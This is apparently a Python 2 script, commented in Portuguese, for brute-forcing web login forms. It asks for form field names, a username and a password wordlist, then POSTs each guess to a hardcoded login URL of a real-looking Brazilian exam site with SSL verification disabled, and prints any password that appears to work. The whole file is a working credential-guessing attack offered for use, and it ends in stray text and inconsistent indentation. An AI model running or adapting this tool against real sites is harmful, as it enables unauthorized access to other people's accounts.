#!/usr/bin/env python
# coding: utf-8

#coded by et1m

__author__ = "et1m"
__date__ = "$13/10/2015 21:00:15$"

#Imports

import requests
from bs4 import BeautifulSoup

	#Banner
	
print '.........................................................................................................'
print '.#####...#####...##..##..######..######...........####...######..##...##..#####...##......######...####..'
print '.##..##..##..##..##..##....##....##..............##........##....###.###..##..##..##......##......##.....'
print '.#####...#####...##..##....##....####.............####.....##....##.#.##..#####...##......####.....####..'
print '.##..##..##..##..##..##....##....##..................##....##....##...##..##......##......##..........##.'
print '.#####...##..##...####.....##....######...........####...######..##...##..##......######..######...####..'
print '.........................................................................................................'
print "[+] Bruteforce Web coded by et1m v0.1"
print ''
print ''

#Observações

print 'você quer ver as observações do script?'
print 'Digite sim para ver as opções'
print ''
help = raw_input("")
print ''

if help == 'sim' :
	
	
	print 'Observação 1 : Para achar o os forms: aperte f12 o chrome (modo desenvolvedor), clique em Network, coloque qualquer valor no formulário de login e aperte enter, agora ache o arquivo de login no Network e veja as forms  '
	print ''
	print 'Observação 2 : Ou ache as forms clicando com o botão direito do mouse em cima do "lugar onde coloca senha e usuário" (text_box), clique em inspecionar elemento, ai vai abrir o modo desenvolvedor do chrome e veja no html a parte que tiver escrito name="form" , o nome que tiver dentro das áspas é seu form , faça iss	o com úusuário,senha e botão de submit  '
	print ''
	print 'Observação 3 : Colocar um trecho do html da pagina de login, esse trecho não pode estar na próxima página(quando efetuar o login na form)'
	
	
	#variaveis
	
	
url = 'http://simuladobrasilconcurso.com.br/usuario/login'#raw_input("coloque a url: ")	#variavel da url
print ''
userf = raw_input("coloque a form do user: ") #variavel do form do user
print ''
senhaf = raw_input("coloque a form da senha: ")#variavel do form da senha
print ''
user = raw_input ("coloque o usuário: ")#variavel do use
print ''
#texto = 'text/javascript">var user_logado = false'
print 'Observação: Colocar um trecho do html da pagina de login, esse trecho não pode estar na próxima página(quando efetuar o login na form)'
print ''
texto = raw_input("coloque um trecho do html da página de login: ")
print ''
dicionario = raw_input("coloque o arquivo do brute: ")
dicionario = open(dicionario, "r")
print ''

	# BruteForce 

for senha in dicionario:
                
               
		

                payload = { userf : user, senhaf : senha} # aqui vai os forms que vão para a requisição POST abaixo, se seu alvo tiver mais forms por favor adicione aqui, exeplo  "nomedoform" : "conteudo do form"
                

		r = requests.post(url, data=payload, verify=False, ) #requisição POST + data o verify = false , não verifica certificados ssl, casos o site seja https 
		
               
                html = r.text # armazena o conteudo html da page requerido na var html

                teste = BeautifulSoup(html) # var teste recebe o modulo BeautifulSoup integrando o html requerido

                validador = teste.find_all(text = 'et1m') #valida o if o valor do text não pode existeir no html do site, por isso et1m é o valor mas pode ser 

                verdade = teste.find_all(text = texto) 

		
				
                if verdade == validador : #se depois do submit o valor não dor igual a page seguinte deu certo

                    
                    print '[+] Deu certo , sua senha é:  ', senha
	
                else: # agora se o valor continua o mesmo significa que vc ainda tá na page de login e não no cpanel

                    print '[+] Não deu certo ',senha
                
                	
             testeeee
            
                
   
                    
                    
